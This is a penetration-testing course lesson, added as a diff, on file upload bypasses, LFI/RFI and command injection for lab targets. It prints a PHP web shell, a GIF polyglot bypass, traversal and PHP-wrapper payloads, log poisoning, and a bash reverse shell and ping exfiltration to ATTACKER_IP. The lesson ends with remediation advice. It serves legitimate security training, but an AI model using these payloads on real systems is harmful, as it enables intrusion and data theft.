@@ -1,0 +1,168 @@
+# Web Module — Lesson 4: File Upload, File Inclusion & Command Injection
+
+**Methodology phase:** Exploitation → the bridge to a shell. These three flaw classes are grouped because they're the usual web-to-shell routes on a boot2root-style target, and PT1's web section often ends with "get code execution."
+**Why together:** all three end the same way — *your input becomes something the server executes*. Upload gives you a file to run; inclusion runs a file you point at; command injection runs OS commands directly.
+
+---
+
+## Part A — File Upload vulnerabilities
+
+### A1. The concept
+The app lets you upload a file and stores it somewhere web-accessible. If it doesn't validate the type properly and the upload directory executes code, you upload a **web shell** and browse to it for remote code execution (RCE).
+
+A minimal PHP web shell:
+```php
+<?php system($_GET['cmd']); ?>
+```
+Upload it as `shell.php`, then visit `http://target/uploads/shell.php?cmd=id` → the server runs `id` and prints the output. That's RCE.
+
+### A2. The checks apps use, and how each fails
+
+| Check | Bypass |
+|---|---|
+| Client-side JS only | Intercept in Burp and change the file after the JS "passed" |
+| Extension blacklist (`.php` blocked) | Alternate extensions: `.php5`, `.phtml`, `.pht`, `.phar` |
+| Content-Type check | Set `Content-Type: image/png` in the request while sending PHP |
+| Magic-byte / image check | **Polyglot**: real image header + PHP payload appended (`GIF89a;<?php ...?>`) |
+| Extension whitelist (`.jpg` only) | Double extension `shell.jpg.php`, or null-byte on old PHP `shell.php%00.jpg` |
+
+> **The magic-byte bypass is worth understanding deeply** — apps that call `getimagesize()` accept a file that *starts* with a valid image signature. Prepend `GIF89a;` to your PHP and it passes the image check while still executing as PHP if the server hands `.php` to the interpreter. You still need the file to *run* as PHP, which is why extension handling matters as much as content.
+
+### A3. Worked example — image filter bypass to shell
+Room: **[TryHackMe — Upload Vulnerabilities](https://tryhackme.com/room/uploadvulns)**.
+
+1. Try the obvious `shell.php` → rejected ("images only").
+2. Make a polyglot:
+```bash
+echo 'GIF89a;' > shell.php
+echo '<?php system($_GET["cmd"]); ?>' >> shell.php
+```
+`GIF89a;` is the GIF magic header, so an image-content check passes; the PHP still executes.
+3. Upload, intercept in Burp, set `Content-Type: image/gif`. Accepted.
+4. Find the upload path (often `/uploads/`), then:
+```
+http://target/uploads/shell.php?cmd=id
+```
+5. Upgrade to a real reverse shell (see Part C) rather than living in a `?cmd=` web shell.
+
+> **Dead end kept in:** I uploaded successfully but got a blank page at the file URL. The upload dir was configured *not* to execute PHP. The working path was `.phtml`, which that server's config still ran. Lesson: a successful *upload* isn't RCE — you need the file to *execute*. Try alternate executable extensions before giving up.
+
+---
+
+## Part B — File Inclusion (LFI / RFI)
+
+### B1. The concept
+The app builds a file path from your input:
+```php
+include($_GET['page'] . ".php");   // ?page=home  ->  home.php
+```
+Control `page` and you control which file the server reads/executes.
+
+- **LFI (Local File Inclusion):** read files already on the server.
+- **RFI (Remote File Inclusion):** make the server include a file from *your* URL (needs `allow_url_include=On`, rarer now).
+
+### B2. Reading files with LFI
+```
+?page=/etc/passwd%00        (null byte truncates the ".php" on old PHP)
+?page=../../../../etc/passwd  (path traversal up to filesystem root)
+```
+- `../` climbs one directory; stack enough to reach `/`. Extra `../` are harmless, so over-climb on purpose.
+- `%00` (null byte) cuts off the appended `.php` on PHP &lt; 5.3.4 — know it exists, but most modern targets need a different trick.
+- **PHP wrappers** turn LFI into source disclosure or RCE:
+```
+?page=php://filter/convert.base64-encode/resource=index    (dump source as base64)
+?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+   (data wrapper = code exec)
+```
+The base64 filter is the classic exam move: read an app's source to find hardcoded creds or the next vuln.
+
+### B3. LFI to RCE via log poisoning
+If you can read logs, you can often write to them too. Poison the User-Agent with PHP:
+```bash
+curl -A '<?php system($_GET["c"]); ?>' http://target/
+```
+Then include the log so the poisoned line executes:
+```
+?page=/var/log/apache2/access.log&c=id
+```
+- `-A` sets the User-Agent header; it gets written verbatim into the access log.
+- Including the log makes PHP parse your injected `<?php ?>` line → RCE.
+
+---
+
+## Part C — Command Injection
+
+### C1. The concept
+The app passes your input to a system shell:
+```php
+system("ping -c 1 " . $_GET['host']);   // ?host=8.8.8.8
+```
+Shell metacharacters let you append your own command:
+```
+?host=8.8.8.8;id
+?host=8.8.8.8|id
+?host=8.8.8.8 && id
+?host=8.8.8.8`id`
+?host=8.8.8.8$(id)
+```
+- `;` — run the next command regardless.
+- `|` — pipe; `&&` — run if the first succeeds.
+- `` `...` `` / `$(...)` — command substitution.
+
+### C2. Blind command injection
+If output isn't shown, prove it out-of-band:
+```
+?host=8.8.8.8; ping -c 3 ATTACKER_IP     (watch with tcpdump on your box)
+?host=8.8.8.8; sleep 5                    (5s delay = injection confirmed)
+```
+Then exfil or go straight to a reverse shell (below).
+
+### C3. From any of A/B/C to a reverse shell
+Once you have code execution by *any* route, upgrade to an interactive shell. Listener first:
+```bash
+nc -lvnp 4444
+```
+- `-l` listen, `-v` verbose, `-n` no DNS, `-p 4444` port.
+Then trigger a connect-back (grab exact syntax from **revshells.com**):
+```bash
+bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+```
+URL-encode it when sending through a web parameter. Once you catch the shell, stabilise it (`python3 -c 'import pty;pty.spawn("/bin/bash")'`) — covered in the Network privesc module.
+
+---
+
+## Exercises
+
+**Exercise 1 — upload bypass.** On the Upload Vulnerabilities room, get a web shell past an image filter. Which extension/technique worked, and why did the first attempt fail?
+**Exercise 2 — LFI source read.** Use the `php://filter` base64 wrapper to dump a PHP file's source. Decode it and find something useful (a path, a credential, another parameter).
+**Exercise 3 — command injection.** Find a parameter that reaches a shell. Confirm blind injection with `sleep`, then get command output.
+**Exercise 4 — chain to shell + report.** Turn any of the above into a reverse shell, then write the finding, including the exact request and the remediation for that flaw class.
+
+---
+
+<details>
+<summary><b>Solutions & debrief</b></summary>
+
+**Exercise 1.** Common working answers: `.phtml` or a `GIF89a;`-prefixed polyglot with `Content-Type: image/gif` set in Burp. First attempts fail either because the extension is blacklisted (`.php`) or the upload dir doesn't execute PHP — the fix is an alternate executable extension the server config still maps to the PHP handler.
+
+**Exercise 2.** `?page=php://filter/convert.base64-encode/resource=config` → copy the base64 → `echo '<b64>' | base64 -d`. You'll often find DB creds or an include path that reveals the next step.
+
+**Exercise 3.** `?host=127.0.0.1; sleep 5` — if the response takes ~5s, injection is confirmed even with no visible output. Then `?host=127.0.0.1; id` (or exfil via `ping ATTACKER_IP` watched with `tcpdump -i tun0 icmp`).
+
+**Exercise 4 — model finding.**
+> **Title:** Remote code execution via unrestricted file upload (Critical).
+> **Endpoint:** `POST /upload`, `file` parameter.
+> **Reproduction:** Upload `shell.phtml` containing `<?php system($_GET['cmd']); ?>` with `Content-Type: image/gif`; browse to `/uploads/shell.phtml?cmd=id` to execute commands as the web user, then establish a reverse shell.
+> **Impact:** Full remote code execution on the web server as the service account — foothold for lateral movement and privilege escalation.
+> **Remediation:** Validate uploads with a strict server-side extension *whitelist*, store uploads outside the web root or in a directory with execution disabled, rename files to random identifiers, and verify content type server-side. For inclusion/command flaws: never pass user input to `include`/shell calls; use whitelists and safe APIs (parameterised, no shell).
+
+</details>
+
+---
+
+## Carry forward
+
+- All three are "input becomes execution." Recognise the sink (upload dir, `include`, `system`) and the game is about getting a payload to *run*, not just *land*.
+- A successful upload/include isn't RCE until code executes — chase execution, not the 200 OK.
+- Every route ends at a reverse shell (revshells.com + `nc -lvnp`). That handoff feeds straight into the Network privesc module.
+
+**Next lesson:** `web/05-ssti.md` — when the template engine evaluates your input.
